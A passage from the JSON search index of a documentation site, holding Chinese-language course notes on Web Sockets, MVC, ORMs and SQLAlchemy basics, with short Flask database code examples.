\u5185\u90e8\u7684\u72b6\u6001\u53d8\u5316\uff0c\u5bfc\u81f4\u7528\u6237\u5237\u65b0\u9875\u9762\u540e\u56de\u5230\u521d\u59cb\u72b6\u6001\uff0c\u800c\u4e0d\u662f\u5237\u65b0\u524d\u7684\u201c\u9875\u9762\u201d\u3002\u5c3d\u7ba1\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539\u6d4f\u89c8\u5668\u5386\u53f2\u8bb0\u5f55 API \u6765\u6a21\u62df\u524d\u8fdb/\u540e\u9000\u529f\u80fd\uff0c\u4f46\u8fd9\u53ef\u80fd\u4f1a\u5bfc\u81f4\u884c\u4e3a\u4e0d\u7a33\u5b9a\u3002</li> </ul> <p>\u6839\u636e\u8bb2\u5ea7\u5185\u5bb9\uff0c\u5355\u9875\u5e94\u7528\u5e26\u6765\u4e86\u8bb8\u591a\u9ebb\u70e6\uff0c\u7279\u522b\u662f\u5bf9\u4e8e\u57fa\u4e8e\u201c\u9875\u9762\u201d\u903b\u8f91\u7684\u5e94\u7528\u6765\u8bf4\u3002\u5982\u679c\u9700\u8981\u6781\u5ea6\u65e0\u7f1d\u548c\u9ad8\u5ea6\u53ef\u63a7\u7684\u7528\u6237\u4f53\u9a8c\uff0c\u521b\u5efa\u539f\u751f\u79fb\u52a8\u5e94\u7528\u53ef\u80fd\u662f\u66f4\u597d\u7684\u9009\u62e9\uff0c\u800c\u4e0d\u662f\u5f3a\u884c\u7528 Web \u6280\u672f\u6784\u5efa SPA\u3002</p> <p>\u8bfe\u7a0b\u9879\u76ee\u8981\u6c42\uff1a \u8bf7\u4e0d\u8981\u521b\u5efa\u5355\u9875\u5e94\u7528\uff01\u9879\u76ee\u7684\u7edd\u5927\u90e8\u5206\u5e94\u8be5\u4f7f\u7528 Jinja \u6a21\u677f\u548c\u670d\u52a1\u5668\u7aef\u6e32\u67d3\u6765\u5b9e\u73b0\u3002</p>"},{"location":"cs/mern/3403/l10/#4-web-socket","title":"4. Web Socket \u7684\u76ee\u7684","text":"<p>HTTP \u8bf7\u6c42\u5bf9\u4e8e\u83b7\u53d6\u52a8\u6001\u5185\u5bb9\u5f88\u6709\u7528\uff0c\u4f46\u5b83\u4eec\u7684\u8bbe\u7f6e\u76f8\u5bf9\u91cd\u91cf\u7ea7\u4e14\u6602\u8d35\u3002HTTP \u8bf7\u6c42\u672c\u8d28\u4e0a\u662f\u5355\u6b21\u4e8b\u52a1\uff1a\u5ba2\u6237\u7aef\u53d1\u9001\u8bf7\u6c42\uff0c\u670d\u52a1\u5668\u54cd\u5e94\uff0c\u7136\u540e\u4e24\u8005\u901a\u5e38\u5c31\u5fd8\u8bb0\u4e86\u8fd9\u6b21\u4ea4\u4e92\uff08\u9664\u975e\u901a\u8fc7 Cookie \u7b49\u65b9\u5f0f\u7ef4\u62a4\u72b6\u6001\uff09\u3002</p> <p>\u7136\u800c\uff0c\u8bb8\u591a Web \u5e94\u7528\u4f9d\u8d56\u4e8e\u5b9e\u65f6\u4ea4\u4e92\uff0c\u4f8b\u5982\u804a\u5929\u5e94\u7528\u3001\u5b9e\u65f6\u8bb0\u5206\u677f\u3001\u80a1\u7968\u4ef7\u683c\u66f4\u65b0\u3001\u5929\u6c14\u9884\u62a5\u6216\u65b0\u95fb\u63a8\u9001\u3002\u5bf9\u4e8e\u8fd9\u7c7b\u5e94\u7528\uff0c\u4e0d\u65ad\u5730\u53d1\u9001 HTTP \u8bf7\u6c42\uff08\u4f8b\u5982\uff0c\u4f7f\u7528 AJAX \u5b9a\u671f\u8f6e\u8be2\u670d\u52a1\u5668\uff09\u6548\u7387\u5f88\u4f4e\uff0c\u4e14\u65e0\u6cd5\u5b9e\u73b0\u771f\u6b63\u7684\u670d\u52a1\u5668\u5411\u5ba2\u6237\u7aef\u7684\u5373\u65f6\u63a8\u9001\u3002</p> <p>Web Socket \u6280\u672f\u4e8e 2011 \u5e74\u88ab\u6807\u51c6\u5316\uff0c\u65e8\u5728\u63d0\u4f9b\u5168\u53cc\u5de5\uff08\u53cc\u5411\uff09\u901a\u4fe1\u3002Web Socket \u5141\u8bb8\u5ba2\u6237\u7aef\u7684 JavaScript \u4e0e\u670d\u52a1\u5668\u5efa\u7acb\u4e00\u4e2a\u6301\u4e45\u7684\u8fde\u63a5\uff08\u6570\u636e\u6d41\uff09\u3002\u4e00\u65e6\u8fde\u63a5\u5efa\u7acb\uff0c\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u5c31\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e2a\u8fde\u63a5\u8fdb\u884c\u8f7b\u91cf\u7ea7\u7684\u53cc\u5411\u6570\u636e\u4f20\u8f93\uff0c\u800c\u65e0\u9700\u53cd\u590d\u5efa\u7acb\u548c\u62c6\u9664 HTTP \u8fde\u63a5\u3002\u8fd9\u4f7f\u5f97\u5728\u5e94\u7528\u4e2d\u5b9e\u73b0\u5b9e\u65f6\u901a\u4fe1\u6210\u4e3a\u53ef\u80fd\u3002\u670d\u52a1\u5668\u53ef\u4ee5\u4e3b\u52a8\u5411\u5df2\u8fde\u63a5\u7684\u5ba2\u6237\u7aef\u63a8\u9001\u6d88\u606f\uff0c\u5ba2\u6237\u7aef\u5219\u901a\u8fc7\u76d1\u542c\u5668\u67b6\u6784\u7acb\u5373\u54cd\u5e94\u8fd9\u4e9b\u63a8\u9001\u3002</p> <p>\u5728 Flask \u4e2d\uff0cWeb Socket \u901a\u8fc7 <code>flask-socketIO</code> \u6269\u5c55\u5305\u63d0\u4f9b\u652f\u6301\u3002<code>socketIO</code> \u9002\u7528\u4e8e\u4f20\u8f93\u8f7b\u91cf\u7ea7\u5b9e\u65f6\u6570\u636e\uff0c\u5982\u804a\u5929\u6d88\u606f\u6216\u5206\u5e03\u5f0f\u6e38\u620f\u4e2d\u7684\u4e8b\u4ef6\u66f4\u65b0\u3002\u5bf9\u4e8e\u9700\u8981\u4f20\u8f93\u5927\u91cf\u5b9e\u65f6\u6d41\u6570\u636e\uff08\u5982\u89c6\u9891\u6216\u97f3\u9891\uff09\u7684\u5e94\u7528\uff0c\u901a\u5e38\u4f7f\u7528 WebRTC \u6216\u5176\u4ed6\u5e93\uff0c\u56e0\u4e3a\u5b83\u4eec\u53ef\u80fd\u652f\u6301\u70b9\u5bf9\u70b9\u8fde\u63a5\u4ee5\u51cf\u5c11\u670d\u52a1\u5668\u4e2d\u8f6c\u5e26\u6765\u7684\u5ef6\u8fdf\u3002</p> <p><code>socketIO</code> \u67b6\u6784\u4e2d\u6709\u4e00\u4e2a\u201c\u623f\u95f4\u201d\u7684\u6982\u5ff5\uff0c\u7528\u6237\u6216\u8fdb\u7a0b\u53ef\u4ee5\u52a0\u5165\u6216\u79bb\u5f00\u623f\u95f4\u3002\u670d\u52a1\u5668\u53ef\u4ee5\u5411\u7279\u5b9a\u623f\u95f4\u5185\u7684\u6240\u6709\u5ba2\u6237\u7aef\u5e7f\u64ad\u6d88\u606f\u3002\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u901a\u8fc7\u53d1\u9001\u548c\u63a5\u6536\u201c\u4e8b\u4ef6\u201d\u6765\u4ea4\u4e92\uff0c\u4e8b\u4ef6\u53ef\u4ee5\u6709\u9884\u5b9a\u4e49\u7684\u540d\u79f0\uff08\u5982 <code>join</code>, <code>status</code>, <code>message</code>, <code>leave</code>\uff09\u6216\u81ea\u5b9a\u4e49\u540d\u79f0\u3002</p>"},{"location":"cs/mern/3403/l10/#5-web-socket","title":"5. Web Socket \u7684\u5e38\u89c1\u7528\u4f8b","text":"<p>Web Socket \u9002\u7528\u4e8e\u4efb\u4f55\u9700\u8981\u5ba2\u6237\u7aef\u4e0e\u670d\u52a1\u5668\u4e4b\u95f4\u8fdb\u884c\u5b9e\u65f6\u3001\u4f4e\u5ef6\u8fdf\u53cc\u5411\u901a\u4fe1\u7684\u573a\u666f\uff1a</p> <ul> <li>\u5b9e\u65f6\u804a\u5929\u5e94\u7528\uff1a \u5ba2\u6237\u7aef\u53d1\u9001\u6d88\u606f\u5230\u670d\u52a1\u5668\uff0c\u670d\u52a1\u5668\u901a\u8fc7 Web Socket \u5c06\u6d88\u606f\u5e7f\u64ad\u7ed9\u804a\u5929\u5ba4\u5185\u7684\u5176\u4ed6\u5ba2\u6237\u7aef\u3002</li> <li>\u591a\u4eba\u5728\u7ebf\u6e38\u620f\uff1a \u7528\u4e8e\u540c\u6b65\u6e38\u620f\u72b6\u6001\u3001\u53d1\u9001\u73a9\u5bb6\u64cd\u4f5c\u7b49\u5b9e\u65f6\u4e8b\u4ef6\u3002</li> <li>\u5b9e\u65f6\u6570\u636e\u66f4\u65b0\uff1a \u4f8b\u5982\u5b9e\u65f6\u80a1\u7968\u4ef7\u683c\u3001\u5929\u6c14\u4fe1\u606f\u3001\u4f53\u80b2\u8d5b\u4e8b\u6bd4\u5206\u76f4\u64ad\u7b49\u3002</li> <li>\u5b9e\u65f6\u901a\u77e5\u7cfb\u7edf\uff1a \u670d\u52a1\u5668\u53ef\u4ee5\u5373\u65f6\u5c06\u65b0\u6d88\u606f\u3001\u65b0\u4e8b\u4ef6\u7b49\u901a\u77e5\u63a8\u9001\u5230\u5ba2\u6237\u7aef\u3002</li> <li>\u5b9e\u65f6\u535a\u5ba2\u6216\u6d3b\u52a8\u6d41\uff1a \u5f53\u6709\u65b0\u5185\u5bb9\u53d1\u5e03\u65f6\uff0c\u53ef\u4ee5\u7acb\u5373\u63a8\u9001\u5230\u6240\u6709\u5728\u7ebf\u7528\u6237\u3002</li> <li>\u79c1\u6709\u804a\u5929\u548c\u7fa4\u7ec4\u804a\u5929\uff1a \u901a\u8fc7\u7ed3\u5408\u7528\u6237\u8ba4\u8bc1\u3001\u4f1a\u8bdd\u7ba1\u7406\u4ee5\u53ca Socket.IO \u7684\u547d\u540d\u7a7a\u95f4\u548c\u623f\u95f4\u529f\u80fd\uff0c\u53ef\u4ee5\u5b9e\u73b0\u7528\u6237\u4e4b\u95f4\u7684\u79c1\u804a\u548c\u7fa4\u7ec4\u804a\u5929\u3002</li> </ul> <p>\u8bfe\u7a0b\u9879\u76ee\u8981\u6c42\uff1a \u5728\u8bfe\u7a0b\u9879\u76ee\u4e2d\uff0c\u5b9e\u73b0 Socket \u662f\u53ef\u9009\u7684\uff0c\u5e76\u6ca1\u6709\u4e13\u95e8\u4e3a Socket \u5206\u914d\u5206\u6570\u3002\u53ef\u4ee5\u6839\u636e\u9879\u76ee\u9700\u6c42\u51b3\u5b9a\u662f\u5426\u4f7f\u7528 Web Socket\u3002</p>"},{"location":"cs/mern/3403/l10/#6","title":"6. \u8bfe\u7a0b\u9879\u76ee\u4e0e\u672c\u8bb2\u5ea7\u5185\u5bb9\u7684\u5173\u8054","text":"<p>\u5982\u524d\u6240\u8ff0\uff0c\u8bfe\u7a0b\u9879\u76ee\u7684\u5927\u90e8\u5206\u5185\u5bb9\u5e94\u4f7f\u7528\u670d\u52a1\u5668\u7aef\u6e32\u67d3\u548c Jinja \u6a21\u677f\u6765\u5b9e\u73b0\u3002\u7136\u800c\uff0c\u9879\u76ee\u5fc5\u987b\u5c55\u793a\u60a8\u4e86\u89e3\u5e76\u77e5\u9053\u5982\u4f55\u4f7f\u7528 AJAX \u8bf7\u6c42\uff0c\u5e76\u5728\u4e0d\u91cd\u65b0\u52a0\u8f7d\u9875\u9762\u7684\u60c5\u51b5\u4e0b\u4e0e\u670d\u52a1\u5668\u4f20\u8f93\u6570\u636e\u3002\u8fd9\u90e8\u5206\u5c06\u4f1a\u6709\u8bc4\u5206\u3002</p> <p>\u6700\u81ea\u7136\u7684\u5b9e\u73b0 AJAX \u7684\u5730\u65b9\u662f\u7528\u6237\u641c\u7d22\u529f\u80fd\u3002\u4f8b\u5982\uff1a</p> <ol> <li>\u7528\u6237\u5728\u641c\u7d22\u6846\u4e2d\u8f93\u5165\uff08\u90e8\u5206\uff09\u7528\u6237\u540d\u3002</li> <li>\u5ba2\u6237\u7aef JavaScript \u53d1\u9001\u4e00\u4e2a AJAX \u8bf7\u6c42\u5230\u670d\u52a1\u5668\uff0c\u5c06\u8f93\u5165\u7684\u6587\u672c\u4f5c\u4e3a\u53c2\u6570\u3002</li> <li>\u670d\u52a1\u5668\u67e5\u8be2\u6570\u636e\u5e93\uff08\u6216\u6587\u4ef6\u7b49\uff09\u627e\u5230\u5339\u914d\u7684\u7528\u6237\u5217\u8868\u3002</li> <li>\u670d\u52a1\u5668\u5c06\u5339\u914d\u7684\u7528\u6237\u5217\u8868\u4f5c\u4e3a\u54cd\u5e94\uff08\u4f8b\u5982 JSON \u683c\u5f0f\uff09\u53d1\u9001\u56de\u5ba2\u6237\u7aef\u3002</li> <li>\u5ba2\u6237\u7aef JavaScript \u63a5\u6536\u5230\u6570\u636e\u540e\uff0c\u52a8\u6001\u66f4\u65b0\u9875\u9762\uff0c\u663e\u793a\u5339\u914d\u7684\u7528\u6237\u5217\u8868\u4f9b\u7528\u6237\u9009\u62e9\u3002</li> </ol>"},{"location":"cs/mern/3403/l11/","title":"11.0 Databases and ORM","text":""},{"location":"cs/mern/3403/l11/#1-mvc-architecture-and-how-it-maps-to-web-development","title":"1. MVC architecture and how it maps to web development","text":"<ul> <li>Purpose\uff1aModel-View-Controller (MVC) \u662f\u4e00\u79cd\u6d41\u884c\u7684\u670d\u52a1\u5668\u7aef Web \u5e94\u7528\u7a0b\u5e8f\u67b6\u6784\u8bbe\u8ba1\u6a21\u5f0f\u3002\u5b83\u63cf\u8ff0\u4e86\u5982\u4f55\u7ec4\u7ec7\u6982\u5ff5\u3002</li> <li>Mapping to Web Development\uff1a<ul> <li>Model\uff1a\u6307\u5e94\u7528\u7a0b\u5e8f\u4e2d\u7531\u6570\u636e\u5e93\u652f\u6301\u7684 Python \u5bf9\u8c61\uff08\u4f8b\u5982 SQLite\uff09\u3002\u4e00\u4e2a Model \u662f\u4e0e\u6570\u636e\u5e93\u4e2d\u7684\u4e00\u4e2a\u5b9e\u4f53\u914d\u5bf9\u7684\u5bf9\u8c61\u3002</li> <li>View\uff1a\u6307\u7531 Jinja \u6a21\u677f\u521b\u5efa\u7684 HTML \u9875\u9762\u3002</li> <li>Controller\uff1a\u6307 <code>routes.py</code> \u4e2d\u7684\u4ee3\u7801\uff0c\u8d1f\u8d23\u8fde\u63a5 Model \u548c\u6570\u636e\u5e93\uff0c\u6839\u636e Model \u51c6\u5907 View\uff0c\u4ee5\u53ca\u66f4\u65b0\u548c\u4fdd\u5b58 Model \u56de\u6570\u636e\u5e93\u3002</li> </ul> </li> <li>Advantages\uff1a\u5c06 Web \u5e94\u7528\u7a0b\u5e8f\u5212\u5206\u4e3a MVC \u5177\u6709\u591a\u79cd\u4f18\u70b9\uff1a<ul> <li>\u53ef\u4ee5\u4fee\u6539 View \u800c\u4e0d\u6539\u53d8 Model\u3002</li> <li>\u53ef\u4ee5\u66ff\u6362\u6570\u636e\u5e93\u800c\u4e0d\u6539\u53d8 View\u3002</li> <li>\u4e13\u4e1a\u5f00\u53d1\u8005\u53ef\u4ee5\u5206\u522b\u5904\u7406\u5404\u81ea\u7684\u90e8\u5206\u3002</li> <li>\u53ef\u4ee5\u652f\u6301\u591a\u4e2a View\uff08\u4f8b\u5982\uff0c\u7f51\u9875 + \u79fb\u52a8\u5e94\u7528\uff09\u3002</li> <li>\u66f4\u5bb9\u6613\u9694\u79bb\u6d4b\u8bd5\u5404\u90e8\u5206\u3002</li> </ul> </li> <li>Designing\uff1a\u8981\u8bbe\u8ba1 MVC \u89e3\u51b3\u65b9\u6848\u67b6\u6784\uff0c\u9700\u8981\u786e\u5b9a\u6240\u9700\u7684 Model\u3001View \u548c Controller\u3002\u53ef\u4ee5\u4ece\u7528\u6237\u6545\u4e8b\u4e2d\u8bc6\u522b\u540d\u8bcd\u4f5c\u4e3a Model\uff0c\u52a8\u8bcd\u4f5c\u4e3a routes\uff08Controller \u7684\u4e00\u90e8\u5206\uff09\uff0c\u5e76\u4e3a\u6307\u5b9a\u7528\u6237\u5173\u8054 View\u3002\u8fd8\u53ef\u4ee5\u6a21\u62df View \u7684\u7ebf\u6846\u56fe\uff08wireframe sketches\uff09\uff0c\u5c55\u793a\u7528\u6237\u754c\u9762\u7684\u57fa\u672c\u5e03\u5c40\u548c\u529f\u80fd\u3002\u4e5f\u53ef\u4ee5\u6a21\u62df\u5178\u578b\u7684 HTTP \u8bf7\u6c42\u548c\u54cd\u5e94\u3002</li> </ul>"},{"location":"cs/mern/3403/l11/#2-purpose-pros-cons-of-an-orm","title":"2. Purpose, pros, cons of an ORM","text":"<ul> <li>Purpose\uff1aObject-Relational Mapping (ORM) \u5e93\u4f1a\u81ea\u52a8\u521b\u5efa\u5bf9\u5e94\u4e8e\u6570\u636e\u5e93\u8868\u4e2d\u6bcf\u4e00\u884c\u7684\u5bf9\u8c61\uff0c\u5e76\u5141\u8bb8\u901a\u8fc7\u539f\u751f\u4ee3\u7801\uff08\u5982 Python\uff09\u76f4\u63a5\u64cd\u4f5c\u6570\u636e\u5e93\u3002\u5b83\u5728\u6570\u636e\u5e93\u4e2d\u7684\u6570\u636e\u548c\u5e94\u7528\u7a0b\u5e8f\u4e2d\u7684 Model \u4e4b\u95f4\u5efa\u7acb\u94fe\u63a5\u3002ORM \u5141\u8bb8\u60a8\u901a\u8fc7\u5bf9\u8c61\u4e0e\u6570\u636e\u5e93\u4ea4\u4e92\uff0c\u800c\u65e0\u9700\u7f16\u5199\u5b9e\u9645\u7684 SQL \u67e5\u8be2\u3002</li> <li>Pros\uff1a<ul> <li>\u52a0\u5feb\u5f00\u53d1\u65f6\u95f4\uff0c\u56e0\u4e3a\u5b9e\u73b0 Model \u7684\u7c7b\u4f1a\u81ea\u52a8\u751f\u6210\u76f8\u5e94\u7684 SQL \u4ee3\u7801\u3002</li> <li>\u62bd\u8c61\u4e86\u6570\u636e\u5e93\u7684\u5177\u4f53\u5b9e\u73b0\u2014\u2014\u4f8b\u5982\uff0c\u53ef\u4ee5\u5728\u4e0d\u6539\u53d8\u4ee3\u7801\u7684\u60c5\u51b5\u4e0b\u4ece SQLite \u5207\u6362\u5230 MySQL\u3002</li> <li>\u4f7f\u4e0e\u6570\u636e\u5e93\u7684\u4ea4\u4e92\u66f4\u52a0\u201cPythonic\u201d\u548c\u57fa\u4e8e\u5bf9\u8c61\u3002</li> <li>\u6bd4\u7f16\u5199\u539f\u59cb SQL \u67e5\u8be2\u66f4\u5bb9\u6613\u3002</li> </ul> </li> <li>Cons\uff1a<ul> <li>\u6709\u65f6\u6027\u80fd\u4f1a\u964d\u4f4e\u2014\u2014\u5e93\u4e3a\u60a8\u751f\u6210 SQL \u67e5\u8be2\uff0c\u8fd9\u4e9b\u67e5\u8be2\u53ef\u80fd\u5e76\u975e\u603b\u662f\u6700\u4f18\u7684\u3002</li> <li>\u53ef\u80fd\u96be\u4ee5\u7406\u89e3\u60a8\u7684\u4ee3\u7801\u6b63\u5728\u6267\u884c\u7684\u5177\u4f53\u6570\u636e\u5e93\u64cd\u4f5c\u3002</li> </ul> </li> <li>Usage\uff1a\u5728\u8bfe\u7a0b\u9879\u76ee\u7ec4\u4e2d\uff0c\u60a8\u5c06\u88ab\u8981\u6c42\u4f7f\u7528 ORM \u5e93\u3002\u8bfe\u7a0b\u4e2d\u4f7f\u7528 SQLAlchemy \u4f5c\u4e3a ORM\u3002\u5982\u679c\u60a8\u5728\u9879\u76ee\u4e2d\u4f7f\u7528\u7eaf SQL \u67e5\u8be2\uff0c\u5c06\u4f1a\u6263\u5206\u3002</li> </ul>"},{"location":"cs/mern/3403/l11/#3-the-very-basics-from-your-previous-database-course","title":"3. The very basics from your previous database course.","text":"<ul> <li>Databases\uff1a\u662f\u6570\u636e\u7684\u6709\u7ec4\u7ec7\u96c6\u5408\u3002\u9700\u8981\u5c06\u5b83\u4eec\u94fe\u63a5\u5230 Web \u5e94\u7528\u7a0b\u5e8f\u4ee5\u5b58\u50a8\u7528\u6237\u4fe1\u606f\u3002</li> <li>Types\uff1a\u6709\u5173\u7cfb\u578b\u6570\u636e\u5e93 (relational databases)\u3001\u6587\u6863\u6570\u636e\u5e93 (document databases)\u3001\u56fe\u6570\u636e\u5e93 (graph databases) \u7b49\u3002Flask \u53ef\u4ee5\u652f\u6301\u591a\u79cd\u6570\u636e\u5e93\u3002\u5173\u7cfb\u578b\u6570\u636e\u5e93\u662f\u6700\u6d41\u884c\u548c\u901a\u7528\u7684\u65b9\u6cd5\u3002NoSQL \u6307\u201c\u4e0d\u4ec5\u4ec5\u662f SQL\u201d\uff0c\u63cf\u8ff0\u975e\u5173\u7cfb\u578b\u6570\u636e\u5e93\u3002</li> <li>Relational Databases\uff1a\u5c06\u6570\u636e\u5b58\u50a8\u4e3a\u4e00\u7ec4\u5173\u7cfb (relations)\uff0c\u6bcf\u4e2a\u5173\u7cfb\u8868\u793a\u4e3a\u4e00\u4e2a\u8868 (table)\u3002\u8868\u7684\u6bcf\u4e00\u884c\u662f\u4e00\u4e2a\u5b9e\u4f53 (entity)\uff0c\u6bcf\u4e00\u5217\u662f\u8be5\u5b9e\u4f53\u7684\u5c5e\u6027 (attribute)\u3002\u6bcf\u4e2a\u5173\u7cfb\u90fd\u6709\u4e00\u4e2a\u5bf9\u4e8e\u8be5\u5173\u7cfb\u4e2d\u6bcf\u4e2a\u5b9e\u4f53\u90fd\u552f\u4e00\u7684\u5c5e\u6027\uff0c\u79f0\u4e3a primary key\u3002\u4e00\u4e9b\u5173\u7cfb\u7684\u5c5e\u6027\u662f\u5176\u4ed6\u5173\u7cfb\u4e2d\u7684 primary key\uff0c\u8fd9\u4e9b\u5c5e\u6027\u79f0\u4e3a foreign keys\u3002</li> <li>DBMS\uff1aDatabase Management System (DBMS) \u662f\u63a7\u5236\u5bf9\u6570\u636e\u5e93\u8bbf\u95ee\u7684\u5e94\u7528\u7a0b\u5e8f\u3002\u8bfe\u7a0b\u4f7f\u7528\u5173\u7cfb\u578b\u6570\u636e\u5e93 SQLite \u4f5c\u4e3a DBMS\uff0c\u56e0\u4e3a\u5b83\u8bbe\u7f6e\u7b80\u5355\u3001\u5305\u4f53\u79ef\u5c0f\u3001\u5c06\u6570\u636e\u5e93\u5b58\u50a8\u4e3a\u5355\u4e2a\u6587\u4ef6\u3002\u7f3a\u70b9\u5305\u62ec\u6269\u5c55\u6027\u4e0d\u4f73\u3001\u6ca1\u6709\u5185\u7f6e\u8ba4\u8bc1\u65b9\u6cd5\u3002</li> <li>Schema\uff1a\u6570\u636e\u5e93\u7684 schema \u662f\u5b9a\u4e49\u7684\u8868 (\u5173\u7cfb) \u96c6\u5408\u3001\u5c5e\u6027\u7c7b\u578b\u4ee5\u53ca\u5c5e\u6027\u7ea6\u675f\u3002\u8fd9\u662f\u6570\u636e\u5e93\u7684\u5143\u6570\u636e (meta-data)\uff0c\u5728\u5e94\u7528\u7a0b\u5e8f\u7684\u6b63\u5e38\u4f7f\u7528\u4e2d\u4e0d\u5e94\u6539\u53d8\u3002</li> <li>CRUD\uff1aCreate, Read, Update, Delete (CRUD) \u662f\u4efb\u4f55\u6301\u4e45\u5316\u5b58\u50a8\u7cfb\u7edf\u7684\u57fa\u672c\u64cd\u4f5c\u3002</li> <li>SQL\uff1aSequential Query Language (SQL) \u63d0\u4f9b\u4e86\u6267\u884c CRUD \u64cd\u4f5c\u7684\u8bed\u6cd5\uff1aCreate \u4f7f\u7528 <code>insert</code> \u8bed\u53e5\uff1bRead \u4f7f\u7528 <code>select</code> \u8bed\u53e5\uff1bUpdate \u4f7f\u7528 <code>update</code> \u8bed\u53e5\uff1bDelete \u4f7f\u7528 <code>delete</code> \u8bed\u53e5\u3002</li> </ul>"},{"location":"cs/mern/3403/l11/#4-at-a-high-level-how-sqlalchemy-can-be-used-to-perform-operations-on-the-database-via-python","title":"4. At a high-level how SQLAlchemy can be used to perform operations on the database via Python.","text":"<ul> <li>SQLAlchemy \u7528\u4e8e\u5c06 SQLite \u6570\u636e\u5e93\u94fe\u63a5\u5230 Flask \u5e94\u7528\u7a0b\u5e8f\u3002</li> <li>\u9700\u8981\u5b89\u88c5 <code>flask-sqlalchemy</code> \u548c <code>flask-migrate</code> \u5305\u3002</li> <li>\u94fe\u63a5\u6b65\u9aa4\uff1a\u914d\u7f6e Flask \u5e94\u7528\u7a0b\u5e8f\u5bf9\u8c61\uff0c\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a <code>db</code> \u7684 SQLAlchemy \u5bf9\u8c61\uff0c\u521b\u5efa\u4e00\u4e2a migrate \u5bf9\u8c61\uff0c\u5bfc\u5165 models \u6a21\u5757\u3002</li> <li>Adding Entities\uff1a<ul> <li>\u521b\u5efa Model \u7684\u5b9e\u4f8b\u3002</li> <li>\u4f7f\u7528 <code>db.session.add()</code> \u5c06\u5b9e\u4f8b\u6dfb\u52a0\u5230 <code>db.session</code> \u5bf9\u8c61\u3002</li> <li>\u6ce8\u610f\uff0c\u6b64\u65f6\u66f4\u6539\u5c1a\u672a\u4fdd\u5b58\u5230\u6570\u636e\u5e93\uff0c\u4ec5\u901a\u77e5 DBMS \u8fd9\u4e9b\u5bf9\u8c61\u5b58\u5728\u3002</li> <li>\u5fc5\u987b\u8c03\u7528 <code>db.session.commit()</code> \u624d\u80fd\u5c06\u6240\u6709\u66f4\u6539\u4e0e\u6570\u636e\u5e93\u540c\u6b65\u3002\u8fd9\u7c7b\u4f3c\u4e8e <code>git add</code> \u540e\u518d <code>git commit</code>\u3002</li> <li>Example\uff1a     <pre><code>from app import db\nfrom app.models import Group # \u5047\u8bbe Group \u662f\u4e00\u4e2a\u6a21\u578b\n\n# \u521b\u5efa Group \u5b9e\u4f8b\nnew_group = Group(group_id=1, group_name='Group Alpha')\n# \u6dfb\u52a0\u5230 session\ndb.session.add(new_group)\n# \u63d0\u4ea4\u5230\u6570\u636e\u5e93\ndb.session.commit()\n</code></pre></li> </ul> </li> <li>Basic Queries\uff1a<ul> <li>\u4f7f\u7528 <code>.&lt;model&gt;.query</code> \u6216 <code>session.query(&lt;model&gt;)</code> \u4ece\u6570\u636e\u5e93\u4e2d\u63d0\u53d6\u5b9e\u4f53\u3002</li> <li><code>.all()</code>\uff1a\u8fd4\u56de\u8be5\u7c7b\u578b\u7684\u6240\u6709\u5b9e\u4f53\u3002</li> <li><code>.get(i)</code>\uff1a\u83b7\u53d6 primary key \u4e3a <code>i</code> \u7684 Model \u5b9e\u4f8b\u3002</li> <li>Example\uff1a     <pre><code>from app.models import Group # \u5047\u8bbe Group \u662f\u4e00\u4e2a\u6a21\u578b\n\n# \u83b7\u53d6\u6240\u6709 Group\nall_groups = Group.query.all()\n# \u83b7\u53d6 primary key \u4e3a 1 \u7684 Group\ngroup_one = Group.query.get(1)\n</code></pre></li> </ul> </li> <li>Deleting Entities\uff1a<ul> <li>\u4f7f\u7528 <code>db.session.delete()</code> \u5220\u9664 Model \u5b9e\u4f8b\u3002</li> <li>\u5fc5\u987b\u8c03\u7528 <code>db.session.commit()</code> \u624d\u80fd\u5c06\u66f4\u6539\u53cd\u6620\u5230\u6570\u636e\u5e93\u3002</li> <li>Example\uff1a     <pre><code>from app import db\nfrom app.models import Group # \u5047\u8bbe Group \u662f\u4e00\u4e2a\u6a21\u578b\n\n# \u83b7\u53d6\u8981\u5220\u9664\u7684 Group (\u4f8b\u5982 primary key \u4e3a 1)\ngroup_to_delete = Group.query.get(1)\n# \u5220\u9664\u5b9e\u4f8b\ndb.session.delete(group_to_delete)\n# \u63d0\u4ea4\u5230\u6570\u636e\u5e93\ndb.session.commit()\n</code></pre></li> </ul> </li> <li>More Complicated Queries\uff1a\u53ef\u4ee5\u4f7f\u7528\u94fe\u5f0f\u67e5\u8be2\u8bed\u6cd5\u6267\u884c\u590d\u6742\u64cd\u4f5c\u3002<ul> <li><code>query.join()</code>\uff1a\u6267\u884c\u5185\u8fde\u63a5 (inner joins)\u3002</li> <li><code>query.outerjoin()</code>\uff1a\u6267\u884c\u5de6\u5916\u8fde\u63a5 (left-outer-joins)\u3002</li> <li><code>filter_by()</code>\uff1a\u8fc7\u6ee4\u7ed3\u679c (\u7c7b\u4f3c SQL \u7684 WHERE \u5b50\u53e5)\u3002</li> <li><code>order_by()</code>\uff1a\u6392\u5e8f\u7ed3\u679c (\u7c7b\u4f3c SQL \u7684 ORDER BY \u5b50\u53e5)\u3002</li> </ul> </li> </ul>"},{"location":"cs/mern/3403/l11/#5-the-meaning-of-basic-sqlalchemy-syntax-for-defining-models","title":"5. The meaning of basic SQLAlchemy syntax for defining models","text":"<ul> <li>Models \u5728 <code>app/models.py</code> \u6587\u4ef6\u4e2d\u5b9a\u4e49\u3002</li> <li>\u5bfc\u5165 <code>db</code> (SQLAlchemy \u7c7b\u7684\u5b9e\u4f8b)\u3002</li> <li>\u5b9a\u4e49\u7ee7\u627f\u81ea <code>db.Model</code> \u7684\u7c7b\u3002\u6bcf\u4e2a\u8fd9\u6837\u7684\u7c7b\u5bf9\u5e94\u6570\u636e\u5e93\u4e2d\u7684\u4e00\u4e2a\u8868\u3002</li> <li>\u4f7f\u7528 <code>db.Column</code> \u5b9a\u4e49\u5217\u3002<ul> <li>\u7b2c\u4e00\u4e2a\u53c2\u6570\u5b9a\u4e49\u5217\u7684\u7c7b\u578b\u3002\u6709\u591a\u79cd\u7c7b\u578b\u53ef\u7528\uff0c\u5305\u62ec string, integer, text, datetime, float, boolean, pickle type, large binary \u7b49\u3002</li> <li>\u53ef\u9009\u7684\u5217\u53c2\u6570\u5305\u62ec <code>nullable</code> (\u662f\u5426\u5141\u8bb8\u4e3a\u7a7a), <code>primary_key</code> (\u662f\u5426\u662f\u4e3b\u952e), <code>foreign_key</code> 